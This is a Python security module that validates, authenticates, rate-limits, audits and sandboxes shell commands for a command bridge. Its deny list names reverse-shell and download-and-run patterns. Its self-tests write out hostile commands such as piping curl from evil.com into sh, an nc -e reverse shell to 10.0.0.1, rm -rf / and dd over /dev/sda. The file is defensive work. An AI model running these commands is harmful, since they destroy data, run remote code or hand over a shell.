#!/usr/bin/env python3
"""
P3 Bridge Security Module v2 — Hardened after security audit.

Fixes applied:
  P0: Encryption is fail-closed (no secret = NO execution, not plaintext)
  P0: XOR fallback REMOVED (cryptography is REQUIRED, not optional)
  P0: HMAC verification MUST happen before command reaches validator
  P1: Replay protection (timestamp window + nonce tracking)
  P1: Whitelist parses by executable (shlex), not prefix matching
  P1: Audit log stores sanitized command (forensic-usable), not just hash
  P1: No silent except:pass — all errors logged
  P1: Sandbox shell escaping fixed (shlex.quote, not list2cmdline)
"""

import json
import time
import os
import re
import shlex
import hashlib
import hmac
import base64
import subprocess
import threading
import logging
from datetime import datetime, timezone
from pathlib import Path

# ──────────────────────────── Logging ────────────────────────────

log = logging.getLogger("p3.security")

# ──────────────────────────── Config ────────────────────────────

P3_SECRET = os.environ.get("P3_SECRET", "")
AUDIT_DIR = os.environ.get("P3_AUDIT_DIR", "/var/log/p3-bridge")
MAX_COMMANDS_PER_MINUTE = int(os.environ.get("P3_RATE_LIMIT", "30"))
MAX_COMMAND_LENGTH = int(os.environ.get("P3_MAX_CMD_LEN", "4096"))
SANDBOX_DIR = os.environ.get("P3_SANDBOX_DIR", "")

# Replay protection
MAX_TIMESTAMP_SKEW = int(os.environ.get("P3_TIMESTAMP_SKEW", "120"))  # seconds
NONCE_CACHE_SIZE = int(os.environ.get("P3_NONCE_CACHE", "10000"))

# Fail-closed mode: if P3_SECRET is required but missing, REJECT
P3_REQUIRE_AUTH = os.environ.get("P3_REQUIRE_AUTH", "1") == "1"

# ──────────────────────────── Command Validation ────────────────────────────

BLOCKED_PATTERNS = [
    r'(?:dd\s+if=.*of=/dev/)',
    r'(?:mkfs\.)',
    r'(?:fdisk|parted|cfdisk)\s',
    r'(?:rm\s+-rf\s+/(?:\s|$))',
    r'(?:rm\s+--recursive\s+/(?:\s|$))',
    r'(?:chmod|chown)\s+.*-R\s+/',
    r'(?:su\s+root)',
    r'(?:pkexec)',
    r'(?:nmap|hping|masscan|nikto|hydra|aircrack)',
    r'(?:fork\s+bomb)',
    r'(?:insmod|rmmod|modprobe)\s',
    r'(?:sysctl)\s+-w\s',
    r'(?:reboot|shutdown|poweroff|halt)(?:\s|$)',
    r'(?:>\s*/etc/(?:passwd|shadow|sudoers|hosts|fstab|crontab))',
    r'(?:xmrig|cryptonight|stratum\+tcp)',
    r'(?:nc\s+-[elp].*\d)',
    r'(?:/bin/(?:ba)?sh\s+-i)',
    r'(?:python[3]?\s+-c.*import\s+pty.*spawn)',
    r'(?:bash\s+-i\s*>\s*&\s*\d)',
    r'(?:curl|wget).*\|\s*(?:ba)?sh',
    r'(?:curl|wget).*\|\s*sudo\s+(?:ba)?sh',
]

# Whitelist: executable → allowed args pattern (None = any args)
WHITELIST_EXECUTABLES = {
    # Read-only / info
    "ls": None, "cat": None, "head": None, "tail": None,
    "grep": None, "find": None, "wc": None, "sort": None, "uniq": None,
    "echo": None, "printf": None, "date": None, "whoami": None,
    "hostname": None, "uname": None, "pwd": None,
    "df": None, "du": None, "free": None, "ps": None, "uptime": None,
    "nproc": None, "lscpu": None, "lsblk": None, "mount": None,
    "tree": None, "which": None, "whereis": None, "file": None, "stat": None,
    "diff": None, "comm": None,
    # File ops (safe subset)
    "mkdir": None, "touch": None, "cp": None, "mv": None, "ln": None,
    # Archives
    "tar": None, "gzip": None, "gunzip": None, "zip": None, "unzip": None,
    # Dev tools (RESTRICTED args — dangerous flags caught in _check_dangerous_flags)
    "git": None,
    "pip": None, "pip3": None,
    "python3": None, "python": None,  # -c blocked in _check_dangerous_flags
    "node": None, "npm": None, "npx": None,  # -c blocked in _check_dangerous_flags
    "docker": None,  # --privileged and dangerous mounts blocked
    "docker-compose": None,
    "curl": None, "wget": None,  # |sh caught by BLOCKED_PATTERNS
    "gpg": None, "openssl": None,
    "rsync": None, "scp": None,
    "sed": None, "awk": None, "cut": None, "tr": None, "paste": None,
    "nvidia-smi": None,
    # System info
    "systemctl": r'^status',  # ONLY "systemctl status ..."
    "journalctl": None,
    # Screenshots
    "spectacle": None, "dbus-send": None,
}


class CommandValidator:
    """Validates commands — whitelist by executable, blacklist always enforced."""

    def __init__(self, mode="whitelist", extra_allowed=None, extra_blocked=None):
        self.mode = mode
        self.allowed_execs = dict(WHITELIST_EXECUTABLES)
        self.blocked = list(BLOCKED_PATTERNS)

        if extra_allowed:
            for item in extra_allowed:
                self.allowed_execs[item] = None
        if extra_blocked:
            self.blocked.extend(extra_blocked)

        config_path = Path.home() / ".p3" / "security.json"
        if config_path.exists():
            try:
                with open(config_path) as f:
                    cfg = json.load(f)
                if "extra_allowed" in cfg:
                    for item in cfg["extra_allowed"]:
                        self.allowed_execs[item] = None
                if "extra_blocked" in cfg:
                    self.blocked.extend(cfg["extra_blocked"])
                if "mode" in cfg:
                    self.mode = cfg["mode"]
            except Exception as e:
                log.warning("Failed to read security config: %s", e)

    def validate(self, cmd):
        """Validate a command. Returns (is_valid, reason)."""
        if not cmd or not cmd.strip():
            return False, "Empty command"

        if len(cmd) > MAX_COMMAND_LENGTH:
            return False, f"Command too long ({len(cmd)} > {MAX_COMMAND_LENGTH})"

        # Step 1: Blocked patterns (ALWAYS enforced, regardless of mode)
        for pattern in self.blocked:
            if re.search(pattern, cmd, re.IGNORECASE):
                return False, f"Blocked pattern: {pattern[:30]}..."

        # Step 2: Whitelist by executable (parse, not prefix!)
        if self.mode == "whitelist":
            return self._validate_whitelist(cmd)

        return True, "OK"

    def _validate_whitelist(self, cmd):
        """Parse command to find executable, check against allowlist.
        This is NOT a prefix check — we extract the actual binary name.
        """
        cmd_stripped = cmd.strip()

        # Try to parse with shlex to get the executable
        try:
            tokens = shlex.split(cmd_stripped)
        except ValueError:
            # Unparseable shell — reject in whitelist mode
            return False, "Unparseable command in whitelist mode"

        if not tokens:
            return False, "Empty command after parsing"

        executable = tokens[0]

        # Handle paths: extract basename
        exec_name = Path(executable).name

        # Check if executable is allowed
        if exec_name not in self.allowed_execs:
            return False, f"Executable not allowed: {exec_name}"

        # Check if there's an args pattern restriction
        args_pattern = self.allowed_execs[exec_name]
        if args_pattern is not None:
            args_str = cmd_stripped[len(executable):].strip()
            if not re.match(args_pattern, args_str):
                return False, f"Args not allowed for {exec_name}: {args_str[:40]}..."

        # Block dangerous flag combos even for allowed executables
        # e.g. python3 -c "...", docker run --privileged, etc.
        dangerous_flags = self._check_dangerous_flags(exec_name, tokens)
        if dangerous_flags:
            return False, dangerous_flags

        return True, "OK"

    def _check_dangerous_flags(self, exec_name, tokens):
        """Check for dangerous flag combinations on allowed executables."""
        token_str = " ".join(tokens)

        # python/python3/node with -c = arbitrary code execution
        if exec_name in ("python", "python3", "node"):
            if "-c" in tokens:
                return f"{exec_name} -c blocked (arbitrary code execution)"

        # docker run --privileged or -v /: = host escape
        if exec_name == "docker":
            if "--privileged" in tokens:
                return "docker --privileged blocked (host escape)"
            for i, t in enumerate(tokens):
                if t == "-v" and i + 1 < len(tokens):
                    mount = tokens[i + 1]
                    src = mount.split(":")[0]
                    if src in ("/", "/etc", "/var", "/home", "/root", "/sys", "/proc"):
                        return f"docker mount {src} blocked (host filesystem access)"

        # find -exec = arbitrary execution
        if exec_name == "find":
            if "-exec" in tokens or "-execdir" in tokens:
                return "find -exec blocked (arbitrary execution)"

        # xargs = arbitrary execution
        if exec_name == "xargs":
            return "xargs blocked (arbitrary execution)"

        return None

    def sanitize_output(self, text, max_len=8000):
        """Sanitize command output — strip tokens, trim length."""
        if not text:
            return text

        for pat in [
            r'ghp_[A-Za-z0-9]{36}',
            r'github_pat_[A-Za-z0-9_]{82}',
            r'gho_[A-Za-z0-9]{36}',
            r'ghr_[A-Za-z0-9]{36}',
            r'ghu_[A-Za-z0-9]{36}',
            r'ghi_[A-Za-z0-9]{36}',
            # AWS keys
            r'AKIA[A-Z0-9]{16}',
            # Generic long hex keys
            r'(?i)(?:api[_-]?key|secret|token|password|credential|private[_-]?key)["\s:=]+([A-Za-z0-9+/=_-]{20,})',
        ]:
            text = re.sub(pat, '***REDACTED***', text)

        text = re.sub(
            r'(https?://)(ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82})(@)',
            r'\1***REDACTED***\3', text
        )

        if len(text) > max_len:
            text = text[:max_len] + f"\n... [truncated, {len(text)} total chars]"

        return text

    def sanitize_cmd_for_audit(self, cmd):
        """Sanitize command for audit log — remove secrets but keep structure.
        This is the CORRECT approach: store sanitized cmd, not just hash.
        Forensic investigation requires knowing WHAT was executed.
        """
        if not cmd:
            return cmd
        # Redact tokens/secrets but keep command structure
        sanitized = cmd
        for pat in [r'ghp_[A-Za-z0-9]{36}', r'github_pat_[A-Za-z0-9_]{82}']:
            sanitized = re.sub(pat, '***TOKEN***', sanitized)
        return sanitized


# ──────────────────────────── Rate Limiter ────────────────────────────

class RateLimiter:
    """Sliding window rate limiter."""

    def __init__(self, max_per_minute=MAX_COMMANDS_PER_MINUTE):
        self.max_per_minute = max_per_minute
        self.timestamps = []
        self.lock = threading.Lock()

    def check(self):
        now = time.time()
        with self.lock:
            self.timestamps = [t for t in self.timestamps if now - t < 60]
            if len(self.timestamps) >= self.max_per_minute:
                oldest = self.timestamps[0]
                retry_after = 60 - (now - oldest) + 0.1
                return False, retry_after
            self.timestamps.append(now)
            return True, 0


# ──────────────────────────── Encryption (FAIL-CLOSED) ────────────────────────────

class ChannelEncryption:
    """Fernet encryption for cmd/result JSON files.

    FAIL-CLOSED: if P3_SECRET is set, cryptography is REQUIRED.
    If cryptography is not installed, the program REFUSES to run.
    NO insecure fallback. NO XOR. NO obfuscation.
    """

    def __init__(self, secret=None):
        secret = secret or P3_SECRET
        if not secret:
            self.enabled = False
            self._fernet = None
            return

        # REQUIRE cryptography — no fallback
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
        except ImportError:
            raise RuntimeError(
                "FAIL-CLOSED: P3_SECRET is set but 'cryptography' is not installed. "
                "Install with: pip install cryptography. "
                "Refusing to run without encryption when authentication is configured."
            )

        # Derive key with PBKDF2 (proper KDF, not raw SHA-256)
        salt = b"p3-bridge-v2-channel-encryption-salt"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=600_000,  # OWASP recommended minimum
        )
        key = kdf.derive(secret.encode("utf-8"))
        fernet_key = base64.urlsafe_b64encode(key)
        self._fernet = Fernet(fernet_key)
        self.enabled = True

    def encrypt(self, plaintext):
        """Encrypt JSON string. Returns Fernet ciphertext."""
        if not self.enabled:
            return plaintext
        return self._fernet.encrypt(plaintext.encode("utf-8")).decode("ascii")

    def decrypt(self, ciphertext):
        """Decrypt Fernet ciphertext. Returns JSON string."""
        if not self.enabled:
            return ciphertext
        return self._fernet.decrypt(ciphertext.encode("ascii")).decode("utf-8")


# ──────────────────────────── Audit Logger (Forensic-Usable) ────────────────────────────

class AuditLogger:
    """Structured audit log — stores SANITIZED command (not just hash).
    Hash-only audit is useless for forensics — you can't investigate
    what was executed if you only have a SHA-256 truncation.
    """

    def __init__(self, log_dir=None):
        self.log_dir = Path(log_dir or AUDIT_DIR)
        try:
            self.log_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            log.warning("Cannot create audit dir %s: %s", self.log_dir, e)
        self._rotate()

    def _rotate(self):
        today = datetime.now().strftime("%Y-%m-%d")
        self.current_file = self.log_dir / f"audit-{today}.jsonl"

    def log(self, cmd_id, cmd, returncode, elapsed, source="bridge",
            cwd=None, user=None):
        self._rotate()

        # Store sanitized command for forensics (secrets redacted, structure preserved)
        validator = get_validator()
        cmd_sanitized = validator.sanitize_cmd_for_audit(cmd)

        # Also store hash for quick lookup
        cmd_hash = hashlib.sha256(cmd.encode("utf-8")).hexdigest()[:16]

        entry = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "cmd_id": cmd_id,
            "cmd_hash": cmd_hash,
            "cmd": cmd_sanitized,  # sanitized, not just hash!
            "cmd_len": len(cmd),
            "rc": returncode,
            "elapsed": round(elapsed, 2),
            "source": source,
        }
        if cwd:
            entry["cwd"] = cwd

        try:
            with open(self.current_file, "a") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")
        except Exception as e:
            log.error("Failed to write audit log: %s", e)

    def get_stats(self, hours=24):
        cutoff = time.time() - hours * 3600
        total = 0
        errors = 0
        total_time = 0

        for log_file in sorted(self.log_dir.glob("audit-*.jsonl")):
            try:
                with open(log_file) as f:
                    for line in f:
                        entry = json.loads(line.strip())
                        ts = datetime.fromisoformat(entry["ts"]).timestamp()
                        if ts >= cutoff:
                            total += 1
                            if entry.get("rc", 0) != 0:
                                errors += 1
                            total_time += entry.get("elapsed", 0)
            except Exception as e:
                log.warning("Failed to read audit log %s: %s", log_file, e)
                continue

        return {
            "total_commands": total,
            "errors": errors,
            "error_rate": errors / total if total > 0 else 0,
            "avg_elapsed": total_time / total if total > 0 else 0,
            "period_hours": hours,
        }


# ──────────────────────────── HMAC Authentication ────────────────────────────

def generate_hmac(cmd_id, cmd, ts, secret=None):
    """Generate HMAC-SHA256 signature for command integrity."""
    key = (secret or P3_SECRET).encode("utf-8")
    message = f"{cmd_id}:{cmd}:{ts}".encode("utf-8")
    return hmac.new(key, message, hashlib.sha256).hexdigest()


def verify_hmac(cmd_id, cmd, ts, signature, secret=None):
    """Verify HMAC signature of a command."""
    expected = generate_hmac(cmd_id, cmd, ts, secret)
    return hmac.compare_digest(expected, signature)


# ──────────────────────────── Replay Protection ────────────────────────────

class ReplayProtection:
    """Track seen nonces (cmd_ids) and verify timestamps.
    Prevents replay of previously executed commands.
    """

    def __init__(self, max_skew=MAX_TIMESTAMP_SKEW, cache_size=NONCE_CACHE_SIZE):
        self.max_skew = max_skew
        self.cache_size = cache_size
        self.seen_nonces = {}  # cmd_id → timestamp
        self.lock = threading.Lock()

    def check(self, cmd_id, ts):
        """Check if command is fresh and not replayed.
        Returns (is_valid, reason).
        """
        now = time.time()

        # Check timestamp freshness
        if abs(now - ts) > self.max_skew:
            return False, f"Timestamp skew too large: {abs(now - ts):.0f}s > {self.max_skew}s"

        # Check nonce uniqueness
        with self.lock:
            if cmd_id in self.seen_nonces:
                return False, f"Replayed command ID: {cmd_id}"

            # Add to seen set
            self.seen_nonces[cmd_id] = now

            # Evict old entries if cache is too large
            if len(self.seen_nonces) > self.cache_size:
                cutoff = now - 3600  # Remove entries older than 1 hour
                self.seen_nonces = {
                    k: v for k, v in self.seen_nonces.items() if v > cutoff
                }

        return True, "OK"


# ──────────────────────────── Auth Verification Pipeline ────────────────────────────

def verify_command_auth(cmd_data):
    """Full authentication verification pipeline for received command.
    This MUST be called BEFORE the command reaches the validator.

    Pipeline: check secret required → decrypt → verify HMAC → replay check

    Returns (cmd_data_decrypted, error_message).
    If error_message is set, the command MUST be rejected.
    """
    crypto = get_crypto()

    # Step 1: Fail-closed — if auth is required, HMAC MUST be present
    if P3_REQUIRE_AUTH and P3_SECRET:
        if "hmac" not in cmd_data:
            return None, "REJECTED: HMAC signature required but missing (fail-closed)"

    # Step 2: Verify HMAC if present
    if "hmac" in cmd_data and P3_SECRET:
        cmd_id = cmd_data.get("id", "")
        cmd = cmd_data.get("cmd", "")
        ts = cmd_data.get("ts", 0)
        signature = cmd_data["hmac"]

        if not verify_hmac(cmd_id, cmd, ts, signature):
            return None, "REJECTED: HMAC signature verification failed"

        log.info("HMAC verified for command %s", cmd_id)

    # Step 3: Replay protection
    cmd_id = cmd_data.get("id", "")
    ts = cmd_data.get("ts", 0)
    replay = get_replay_protection()
    is_fresh, reason = replay.check(cmd_id, ts)
    if not is_fresh:
        return None, f"REJECTED: {reason}"

    return cmd_data, None


# ──────────────────────────── Sandbox Execution ────────────────────────────

def execute_sandboxed(cmd, cwd=None, timeout=120, sandbox_dir=None):
    """Execute command in optional Docker sandbox.
    Uses shlex.quote for proper POSIX shell escaping.
    """
    start = time.time()

    env = dict(os.environ)
    for key in list(env.keys()):
        if any(s in key.upper() for s in ["TOKEN", "SECRET", "PASSWORD", "KEY", "CREDENTIAL"]):
            del env[key]

    if sandbox_dir and Path(sandbox_dir).exists():
        # Proper POSIX shell escaping
        escaped_cmd = shlex.quote(cmd)
        docker_cmd = (
            f"docker run --rm --network=none "
            f"--memory=512m --cpus=1 "
            f"-v {shlex.quote(cwd or '/tmp')}:/workspace "
            f"--workdir=/workspace "
            f"p3-sandbox:latest "
            f"sh -c {escaped_cmd}"
        )
        cmd = docker_cmd
        cwd = None

    try:
        proc = subprocess.Popen(
            cmd, shell=True, cwd=cwd,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL, env=env,
        )
        try:
            stdout, stderr = proc.communicate(timeout=timeout)
            elapsed = time.time() - start
            return (
                stdout.decode("utf-8", errors="replace"),
                stderr.decode("utf-8", errors="replace"),
                proc.returncode, elapsed,
            )
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            elapsed = time.time() - start
            return ("", f"TIMEOUT: exceeded {timeout}s", -1, elapsed)
    except Exception as e:
        elapsed = time.time() - start
        log.error("Command execution failed: %s", e)
        return ("", str(e), -1, elapsed)


# ──────────────────────────── Singletons ────────────────────────────

_validator = None
_limiter = None
_audit = None
_crypto = None
_replay = None


def get_validator():
    global _validator
    if _validator is None:
        mode = os.environ.get("P3_SECURITY_MODE", "whitelist")  # Changed default!
        _validator = CommandValidator(mode=mode)
    return _validator


def get_limiter():
    global _limiter
    if _limiter is None:
        _limiter = RateLimiter()
    return _limiter


def get_audit():
    global _audit
    if _audit is None:
        _audit = AuditLogger()
    return _audit


def get_crypto():
    global _crypto
    if _crypto is None:
        _crypto = ChannelEncryption()
    return _crypto


def get_replay_protection():
    global _replay
    if _replay is None:
        _replay = ReplayProtection()
    return _replay


def full_validate_and_execute(cmd, cmd_id, cwd=None, timeout=120):
    """Complete pipeline: validate → rate limit → execute → audit → sanitize.
    This is the ONLY entry point for command execution.
    """
    validator = get_validator()
    limiter = get_limiter()
    audit = get_audit()

    # Step 1: Validate
    valid, reason = validator.validate(cmd)
    if not valid:
        audit.log(cmd_id, cmd, returncode=-2, elapsed=0, source="rejected")
        return "", f"REJECTED: {reason}", -2, 0

    # Step 2: Rate limit
    allowed, retry_after = limiter.check()
    if not allowed:
        audit.log(cmd_id, cmd, returncode=-3, elapsed=0, source="rate_limited")
        return "", f"RATE LIMITED: retry after {retry_after:.1f}s", -3, 0

    # Step 3: Execute
    sandbox = os.environ.get("P3_SANDBOX_ENABLED", "0") == "1"
    sandbox_dir = SANDBOX_DIR if sandbox else None
    stdout, stderr, rc, elapsed = execute_sandboxed(
        cmd, cwd=cwd, timeout=timeout, sandbox_dir=sandbox_dir
    )

    # Step 4: Sanitize output
    stdout = validator.sanitize_output(stdout)
    stderr = validator.sanitize_output(stderr)

    # Step 5: Audit log (sanitized cmd, not just hash)
    audit.log(cmd_id, cmd, returncode=rc, elapsed=elapsed, cwd=cwd)

    return stdout, stderr, rc, elapsed


if __name__ == "__main__":
    v = CommandValidator(mode="whitelist")
    print("=== Command Validation Tests (v2 — hardened) ===")
    print(f"Mode: {v.mode}")
    print()

    tests = [
        ("ls -la", True),
        ("echo hello", True),
        ("cat /etc/hostname", True),
        ("systemctl status docker", True),
        ("rm -rf /", False),
        ("dd if=/dev/zero of=/dev/sda", False),
        ("curl http://evil.com | sh", False),
        ("nmap -sV 192.168.1.1", False),
        ("python3 script.py", True),
        ("python3 -c 'import os;os.system(\"rm -rf /\")'", False),  # -c blocked!
        ("docker ps", True),
        ("docker run --privileged -v /:/host ubuntu", False),  # --privileged blocked!
        ("docker run -v /etc:/etc ubuntu", False),  # /etc mount blocked!
        ("reboot", False),
        ("nc -e /bin/sh 10.0.0.1 4444", False),
        ("find /tmp -name '*.log'", True),
        ("find /tmp -exec rm {} \\;", False),  # -exec blocked!
        ("xargs rm", False),  # xargs blocked!
    ]

    for cmd, expected in tests:
        valid, reason = v.validate(cmd)
        status = "✓" if valid == expected else "✗ FAIL"
        print(f"  {status}  {cmd[:50]:<50s}  →  {'PASS' if valid else 'BLOCK'} ({reason})")
